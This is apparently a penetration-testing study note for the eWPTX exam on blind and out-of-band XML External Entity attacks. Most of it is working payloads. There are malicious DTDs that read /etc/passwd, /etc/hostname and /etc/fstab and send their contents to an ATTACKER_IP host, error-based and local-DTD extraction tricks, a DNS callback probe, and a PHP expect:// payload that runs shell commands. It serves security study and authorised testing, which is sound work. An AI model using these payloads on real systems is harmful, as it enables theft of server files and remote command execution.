2026-02-06

Status:

Tags: [[eWPTX]] [[XML]]
###### Prerequisites: [[XML External Entities (XXE)]]
# Blind & OOB XXE

## Overview

In blind XXE, the server processes the XXE payload but doesn't reflect the entity value in the response. You need out-of-band (OOB) channels to exfiltrate data.

---

## When to Use Blind XXE

- Application parses XML but doesn't display entity values
- Error messages are suppressed
- Response is a fixed status code (200 OK) regardless of content

---

## OOB Exfiltration via Parameter Entities

### Step 1: Host a malicious DTD on your server

Create `evil.dtd` on attacker server:

```xml
<!ENTITY % file SYSTEM "file:///etc/hostname">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://ATTACKER_IP/?data=%file;'>">
%eval;
%exfil;
```

### Step 2: Send the XXE payload

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "http://ATTACKER_IP/evil.dtd">
  %xxe;
]>
<foo>bar</foo>
```

### Step 3: Capture data on your server

```bash
# Start a listener
python3 -m http.server 8000

# You'll see:
# GET /?data=web-server-01 HTTP/1.1
```

The file content arrives as a query parameter in the HTTP request.

---

## DNS-Based Detection

Simplest way to confirm blind XXE — no data exfiltration, just confirming the vulnerability exists:

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://xxe-test.ATTACKER-DOMAIN.com">
]>
<foo>&xxe;</foo>
```

Use Burp Collaborator or interactsh to detect the DNS lookup.

---

## Error-Based XXE

Force the parser to include file contents in error messages:

### Step 1: Host error DTD

```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
%eval;
%error;
```

### Step 2: Send payload

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "http://ATTACKER_IP/error.dtd">
  %xxe;
]>
<foo>bar</foo>
```

The parser error message may contain:

```
java.io.FileNotFoundException: /nonexistent/root:x:0:0:root:/root:/bin/bash...
```

---

## Blind XXE via Local DTD

When the server blocks outbound connections, reuse a local DTD file already on the server:

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
  <!ENTITY % ISOamso '
    <!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
    <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///x/&#x25;file;&#x27;>">
    &#x25;eval;
    &#x25;error;
  '>
  %local_dtd;
]>
<foo>bar</foo>
```

Common local DTDs to try:
- `/usr/share/yelp/dtd/docbookx.dtd` (Linux with GNOME)
- `/usr/share/xml/fontconfig/fonts.dtd` (Linux)
- `/usr/local/tomcat/lib/jsp-api.jar!/javax/servlet/jsp/resources/jspxml.dtd` (Tomcat)

---

## CDATA Exfiltration for XML-Breaking Characters

When the file contains `<`, `>`, `&` that break the XML syntax:

```xml
<!-- evil.dtd -->
<!ENTITY % file SYSTEM "file:///etc/fstab">
<!ENTITY % start "<![CDATA[">
<!ENTITY % end "]]>">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://ATTACKER/?d=%start;%file;%end;'>">
%eval;
%exfil;
```

---

## PHP expect:// Wrapper (RCE)

If the PHP `expect` extension is loaded:

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "expect://whoami">
]>
<foo>&xxe;</foo>
```

---

## Testing Checklist

1. Test basic entity expansion (non-blind confirmation)
2. Test DNS callback to confirm blind XXE
3. Try OOB HTTP exfiltration with external DTD
4. If outbound HTTP is blocked, try error-based extraction
5. If external connections are blocked entirely, try local DTD technique
6. Test for PHP wrappers if PHP is suspected
